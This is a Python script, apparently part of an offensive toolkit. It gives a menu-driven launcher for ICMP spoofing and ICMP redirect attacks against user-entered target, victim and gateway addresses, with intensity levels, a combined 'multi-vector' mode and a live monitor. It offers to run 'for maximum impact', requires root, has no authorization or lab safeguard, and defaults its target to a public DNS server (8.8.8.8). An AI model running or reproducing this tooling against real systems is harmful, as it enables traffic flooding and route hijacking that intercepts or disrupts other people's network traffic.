#!/usr/bin/env python3
"""
ICMP Attack Demonstration Script
================================

Complete demonstration of ICMP attacks with visual monitoring.
Shows how to use all components together for maximum impact.
"""

import sys
import os
import time
import threading
import subprocess
import signal
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

class AttackDemo:
    """Complete ICMP attack demonstration"""
    
    def __init__(self):
        self.processes = []
        self.monitoring = False
        
    def show_banner(self):
        """Display demo banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("██████╗ ███████╗███╗   ███╗ ██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗")
        print("██╔══██╗██╔════╝████╗ ████║██╔═══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝")
        print("██║  ██║█████╗  ██╔████╔██║██║   ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝ ")
        print("██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ")
        print("██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗")
        print("╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")
        print(f"{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎭 Complete ICMP Attack Demonstration")
        print(f"{Fore.RED}⚠️  Live attack with real-time monitoring")
        print()
    
    def check_requirements(self):
        """Check if all tools are available"""
        required_files = [
            'icmp_attack_tool.py',
            'icmp_spoofer.py', 
            'icmp_redirect.py',
            'attack_monitor.py'
        ]
        
        missing = []
        for file in required_files:
            if not os.path.exists(file):
                missing.append(file)
        
        if missing:
            print(f"{Fore.RED}❌ Missing required files:")
            for file in missing:
                print(f"   - {file}")
            return False
        
        print(f"{Fore.GREEN}✅ All required tools found")
        return True
    
    def get_user_input(self):
        """Get attack configuration from user"""
        print(f"{Fore.CYAN}🎯 ATTACK CONFIGURATION")
        print("=" * 40)
        
        config = {}
        config['target_ip'] = input("Target IP for spoofing: ")
        config['victim_ip'] = input("Victim IP for redirect (optional): ") or None
        config['gateway_ip'] = input("Gateway IP (optional): ") or None
        
        if config['victim_ip'] and config['gateway_ip']:
            config['attack_type'] = 'both'
        else:
            config['attack_type'] = 'spoof'
        
        config['duration'] = int(input("Attack duration (seconds, default 60): ") or 60)
        config['intensity'] = input("Attack intensity (low/medium/high, default medium): ") or 'medium'
        
        return config
    
    def start_monitor(self, targets=None):
        """Start the monitoring dashboard"""
        print(f"{Fore.CYAN}🖥️  Starting monitoring dashboard...")
        
        cmd = ['python3', 'attack_monitor.py']
        if targets:
            cmd.extend(['--targets', ','.join(targets)])
        
        try:
            monitor_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            self.processes.append(monitor_process)
            time.sleep(2)  # Give monitor time to start
            print(f"{Fore.GREEN}✅ Monitor started (PID: {monitor_process.pid})")
            return monitor_process
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to start monitor: {e}")
            return None
    
    def run_spoof_attack(self, target_ip, intensity='medium', duration=60):
        """Run ICMP spoofing attack"""
        print(f"{Fore.YELLOW}🚀 Starting ICMP spoofing attack...")
        
        # Configure attack parameters based on intensity
        if intensity == 'low':
            count, delay = 10, 2
        elif intensity == 'high':
            count, delay = 100, 0.1
        else:  # medium
            count, delay = 50, 0.5
        
        cmd = [
            'python3', 'icmp_spoofer.py', target_ip,
            '--count', str(count),
            '--delay', str(delay),
            '--continuous'
        ]
        
        try:
            spoof_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            self.processes.append(spoof_process)
            print(f"{Fore.GREEN}✅ Spoofing attack started (PID: {spoof_process.pid})")
            return spoof_process
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to start spoofing attack: {e}")
            return None
    
    def run_redirect_attack(self, victim_ip, target_ip, gateway_ip, duration=60):
        """Run ICMP redirect attack"""
        print(f"{Fore.YELLOW}🔀 Starting ICMP redirect attack...")
        
        cmd = [
            'python3', 'icmp_redirect.py',
            victim_ip, target_ip, gateway_ip,
            '--continuous',
            '--duration', str(duration)
        ]
        
        try:
            redirect_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            self.processes.append(redirect_process)
            print(f"{Fore.GREEN}✅ Redirect attack started (PID: {redirect_process.pid})")
            return redirect_process
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to start redirect attack: {e}")
            return None
    
    def show_live_status(self, duration):
        """Show live attack status"""
        print(f"\n{Fore.CYAN}📊 LIVE ATTACK STATUS")
        print("=" * 50)
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            # Simple progress bar
            progress = int((elapsed / duration) * 50)
            bar = "█" * progress + "░" * (50 - progress)
            
            print(f"\r{Fore.YELLOW}⏱️  Progress: {Fore.GREEN}{bar}{Style.RESET_ALL} {elapsed}s/{duration}s", end='', flush=True)
            
            time.sleep(1)
        
        print(f"\n{Fore.GREEN}✅ Attack duration completed!")
    
    def cleanup_processes(self):
        """Clean up all running processes"""
        print(f"\n{Fore.YELLOW}🧹 Cleaning up processes...")
        
        for process in self.processes:
            try:
                # Kill process group to include child processes
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                process.wait(timeout=5)
                print(f"{Fore.GREEN}✅ Process {process.pid} terminated")
            except subprocess.TimeoutExpired:
                # Force kill if necessary
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                print(f"{Fore.YELLOW}⚡ Process {process.pid} force killed")
            except:
                pass
        
        self.processes.clear()
    
    def show_demo_menu(self):
        """Show demonstration menu"""
        print(f"\n{Fore.CYAN}🎭 DEMONSTRATION MENU")
        print("=" * 30)
        print(f"{Fore.GREEN}1.{Style.RESET_ALL} Quick ICMP Spoofing Demo")
        print(f"{Fore.GREEN}2.{Style.RESET_ALL} ICMP Redirect Demo")
        print(f"{Fore.GREEN}3.{Style.RESET_ALL} Complete Attack Demo")
        print(f"{Fore.GREEN}4.{Style.RESET_ALL} Custom Configuration")
        print(f"{Fore.GREEN}5.{Style.RESET_ALL} Monitor Only")
        print(f"{Fore.GREEN}6.{Style.RESET_ALL} Exit")
        print("-" * 30)
    
    def quick_spoof_demo(self):
        """Quick spoofing demonstration"""
        print(f"\n{Fore.MAGENTA}🚀 QUICK ICMP SPOOFING DEMO")
        target = input("Target IP (default 8.8.8.8): ") or "8.8.8.8"
        
        # Start monitor
        monitor = self.start_monitor([target])
        time.sleep(3)
        
        # Run attack
        attack = self.run_spoof_attack(target, 'medium', 30)
        
        if attack:
            self.show_live_status(30)
        
        input(f"\n{Fore.YELLOW}Press Enter to stop demo...")
        self.cleanup_processes()
    
    def redirect_demo(self):
        """ICMP redirect demonstration"""
        print(f"\n{Fore.MAGENTA}🔀 ICMP REDIRECT DEMO")
        victim = input("Victim IP: ")
        target = input("Target IP: ")
        gateway = input("Gateway IP: ")
        
        # Start monitor
        monitor = self.start_monitor([victim, target])
        time.sleep(3)
        
        # Run attack
        attack = self.run_redirect_attack(victim, target, gateway, 60)
        
        if attack:
            self.show_live_status(60)
        
        input(f"\n{Fore.YELLOW}Press Enter to stop demo...")
        self.cleanup_processes()
    
    def complete_demo(self):
        """Complete attack demonstration"""
        print(f"\n{Fore.MAGENTA}🎭 COMPLETE ATTACK DEMONSTRATION")
        print("This demo will run both spoofing and redirect attacks simultaneously")
        
        target = input("Target IP for spoofing: ")
        victim = input("Victim IP for redirect: ")
        gateway = input("Gateway IP: ")
        
        # Start monitor
        monitor = self.start_monitor([target, victim])
        time.sleep(3)
        
        # Start both attacks
        spoof_attack = self.run_spoof_attack(target, 'high', 120)
        redirect_attack = self.run_redirect_attack(victim, target, gateway, 120)
        
        if spoof_attack or redirect_attack:
            print(f"\n{Fore.RED}🔥 MULTI-VECTOR ATTACK IN PROGRESS")
            self.show_live_status(120)
        
        input(f"\n{Fore.YELLOW}Press Enter to stop demo...")
        self.cleanup_processes()
    
    def custom_demo(self):
        """Custom configuration demo"""
        config = self.get_user_input()
        
        targets = [config['target_ip']]
        if config['victim_ip']:
            targets.append(config['victim_ip'])
        
        # Start monitor
        monitor = self.start_monitor(targets)
        time.sleep(3)
        
        # Start attacks based on configuration
        attacks = []
        
        # Always do spoofing
        spoof_attack = self.run_spoof_attack(
            config['target_ip'], 
            config['intensity'], 
            config['duration']
        )
        if spoof_attack:
            attacks.append(spoof_attack)
        
        # Add redirect if configured
        if config['attack_type'] == 'both':
            redirect_attack = self.run_redirect_attack(
                config['victim_ip'],
                config['target_ip'],
                config['gateway_ip'],
                config['duration']
            )
            if redirect_attack:
                attacks.append(redirect_attack)
        
        if attacks:
            self.show_live_status(config['duration'])
        
        input(f"\n{Fore.YELLOW}Press Enter to stop demo...")
        self.cleanup_processes()
    
    def monitor_only(self):
        """Monitor only mode"""
        print(f"\n{Fore.CYAN}📡 MONITOR ONLY MODE")
        targets = input("Target IPs to monitor (comma-separated, optional): ")
        
        target_list = [ip.strip() for ip in targets.split(',')] if targets else None
        
        monitor = self.start_monitor(target_list)
        
        if monitor:
            print(f"{Fore.GREEN}🖥️  Monitor dashboard running...")
            print(f"{Fore.YELLOW}Press Enter to stop monitoring...")
            input()
        
        self.cleanup_processes()
    
    def run_demo(self):
        """Run the interactive demonstration"""
        self.show_banner()
        
        # Check root privileges
        if os.geteuid() != 0:
            print(f"{Fore.RED}❌ Root privileges required")
            print(f"{Fore.YELLOW}💡 Run with: sudo python3 {sys.argv[0]}")
            sys.exit(1)
        
        # Check requirements
        if not self.check_requirements():
            sys.exit(1)
        
        try:
            while True:
                self.show_demo_menu()
                choice = input(f"{Fore.YELLOW}Select demo (1-6): {Style.RESET_ALL}")
                
                if choice == '1':
                    self.quick_spoof_demo()
                elif choice == '2':
                    self.redirect_demo()
                elif choice == '3':
                    self.complete_demo()
                elif choice == '4':
                    self.custom_demo()
                elif choice == '5':
                    self.monitor_only()
                elif choice == '6':
                    print(f"{Fore.GREEN}👋 Demo session ended.")
                    break
                else:
                    print(f"{Fore.RED}Invalid choice. Please select 1-6.")
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Demo interrupted by user")
        
        finally:
            self.cleanup_processes()

def main():
    """Main function"""
    demo = AttackDemo()
    demo.run_demo()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Demo terminated")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}")
        sys.exit(1) 